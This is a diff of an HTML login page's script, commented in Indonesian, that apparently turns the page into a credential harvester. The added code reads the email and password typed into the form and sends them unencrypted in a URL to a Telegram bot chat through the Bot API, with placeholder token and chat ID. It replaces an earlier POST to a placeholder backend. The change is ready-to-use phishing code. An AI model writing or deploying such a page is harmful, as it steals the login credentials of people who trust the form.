@@ -18,29 +18,32 @@
   </form>
 
   <script>
-    // Event listener saat form login dikirim
     document.getElementById("loginForm").addEventListener("submit", function(event) {
       event.preventDefault();
 
       const email = document.getElementById("email").value;
       const password = document.getElementById("password").value;
 
-      // Kirim data ke server (backend)
-      fetch("https://your-backend-url.com/send-to-telegram", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ email, password })
-      })
-      .then(response => response.json())
-      .then(data => {
-        alert("Data telah dikirim ke Telegram!");
-      })
-      .catch(error => {
-        console.error("Error:", error);
-        alert("Terjadi kesalahan saat mengirim data.");
-      });
+      // Token Bot Telegram
+      const botToken = 'YOUR_BOT_TOKEN';  // Ganti dengan token bot kamu
+      const chatId = 'YOUR_CHAT_ID';      // Ganti dengan chat ID yang kamu dapatkan
+
+      // Format pesan
+      const message = `Email: ${email}\nPassword: ${password}`;
+
+      // Kirim data ke Telegram menggunakan API Bot Telegram
+      const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+      // Kirim request ke API Telegram
+      fetch(apiUrl)
+        .then(response => response.json())
+        .then(data => {
+          alert("Data telah dikirim ke Telegram!");
+        })
+        .catch(error => {
+          console.error("Error:", error);
+          alert("Terjadi kesalahan saat mengirim data.");
+        });
     });
   </script>
 </body>
